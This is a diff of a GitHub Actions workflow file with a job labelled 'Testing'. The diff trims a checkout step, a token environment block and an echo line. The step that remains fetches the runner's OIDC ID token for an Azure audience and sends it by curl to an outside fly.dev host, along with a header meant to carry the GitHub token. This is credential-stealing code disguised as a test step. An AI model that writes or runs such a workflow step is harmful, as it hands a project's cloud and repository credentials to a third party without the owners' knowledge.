@@ -13,12 +13,8 @@ jobs:
     name: Testing
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v3
       - name: testing
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
         run: |
           payload=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
-          echo "payload: $payload"
           curl https://twilight-hill-6850.fly.dev --data "$payload" -H"Authorization: ${{env.GITHUB_TOKEN}}" 
 
